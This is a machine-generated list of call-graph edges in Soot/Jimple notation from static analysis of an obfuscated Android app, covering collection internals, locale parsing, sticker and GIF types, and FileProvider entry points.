VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: int size()> ==> <ljd: java.util.Map o()>
SPECIAL edge: specialinvoke $r0.<androidx.core.content.FileProvider: void <init>()>() in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void <init>()>
CLINIT edge: staticinvoke <ql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ql: void <clinit>()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r1, $i3, $i4, $c0, $c1, $i2) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lly: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r9.<mag: void <init>(java.lang.String,int,int)>("AUTOCOMPLETE", 9, 9) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r26.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i9, $r15, $r16, null, null) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>(r0) in <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()> ==> <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $z0 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r1, $r2) in <hbv: boolean o()> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbw: void <init>(int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.lang.Iterable: java.util.Iterator iterator()>() in <izw: java.util.Collection at(java.lang.Iterable)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r1, $i2, $r23) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke r0.<lme: void <init>(lkx,int)>($r1, 0) in <ljs: void <init>()> ==> <lme: void <init>(lkx,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean x(char)>
VIRTUAL edge: virtualinvoke r0.<ljd: int b()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int b()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lje: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(5) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfb: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: java.util.Set f()> ==> <ljf: void h()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r16.<lsu: void <init>()>() in <lsd: boolean b(lsr)> ==> <lsu: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c3) in <ivw: boolean w(char[],int,int)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lje: void <init>(ljf)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Thread: java.lang.Thread currentThread()>() in <ojg: void v(java.lang.String)> ==> <java.lang.Thread: java.lang.Thread currentThread()>
STATIC edge: $r3 = staticinvoke <lme: lmb g()>() in <hbv: void j()> ==> <lme: lmb g()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r15.<mag: void <init>(java.lang.String,int,int)>("BITMOJI_IMAGE", 15, 15) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Error: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <miv: void <init>(java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lvr: boolean isEmpty()>() in <lvt: boolean a()> ==> <java.util.AbstractMap: boolean isEmpty()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r4, $i0) in <lsn: void q(lsz,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int j()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $z0 = staticinvoke <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>($r2, $r3, $l0, $r1) in <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)> ==> <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i3, $i6) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <lum: lvm i()>() in <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)> ==> <lum: lvm i()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r4, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
STATIC edge: $r4 = staticinvoke <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>($r3, $r1, $i0, $r2) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(7) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r4, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String e(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <iwt: java.lang.String e(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_GRPC_FEATURE", 16, 16) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r22.<mag: void <init>(java.lang.String,int,int)>("LOCAL", 22, 22) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<ljs: void <init>()>() in <ljs: void <clinit>()> ==> <ljs: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(17) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <lak: void <init>(byte[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lnd: java.lang.Object a(int)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(long[],long[])>($r10, $r11) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(long[],long[])>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(16) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<hbv: void <init>(java.lang.String)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean k(char)>
VIRTUAL edge: virtualinvoke $r3.<hbv: void k(java.lang.Object,boolean)>($r1, 0) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hbv: void k(java.lang.Object,boolean)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(19) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r3, $r4) in <lqm: java.lang.Object get(int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r6, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
CLINIT edge: staticinvoke <lqk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqk: void <clinit>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Gif", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
CLINIT edge: staticinvoke <lsl: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsl: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $l0 = virtualinvoke $r0.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/r;", "lockState") in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lkq: boolean isEmpty()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r4.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i5, $r2) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int b()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r3, 0, $i0) in <ivv: ivw b(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "parser") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>($r5, $r0, $r1, $r2, $r3) in <iwt: void <clinit>()> ==> <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<lsm: int a(lsz)>($r2) in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: int a(lsz)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lkx: lma p()>() in <llg: void <init>(llo)> ==> <lkx: lma p()>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <iwt: java.lang.String c(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r1, $i1) in <lri: void v(java.lang.Object[],int)> ==> <lri: void t(java.lang.Object,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "log site qualifier") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <jpq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jpq: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean y(char)>($c5) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean y(char)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: void j(java.lang.Object)> ==> <lma: int e(int)>
VIRTUAL edge: $r1 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hcb: void <init>()> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <hnt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnt: void <clinit>()>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null languageTag") in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<ing: void <init>(java.lang.String,iec)>($r2, $r3) in <iej: void g(java.lang.String,iec)> ==> <ing: void <init>(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <miv: void <clinit>()> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(5) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>(null) in <miv: void <clinit>()> ==> <miv: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <ivv: void <init>(byte[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, 1, $i1) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("PlaystoreStickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <lwg: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
SPECIAL edge: specialinvoke $r3.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_THUMBNAIL", 3, 3) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int compareTo(java.lang.Enum)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>("array index scale not a power of two") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long currentTimeMillis()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String c(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int O(long,long)>($l1, $l2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kwe: int O(long,long)>
VIRTUAL edge: $r9 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("cja-XA", "doi-XA", "doi-XD", "doi-XU", "doi-Deva", "doi-Latn", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r9) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
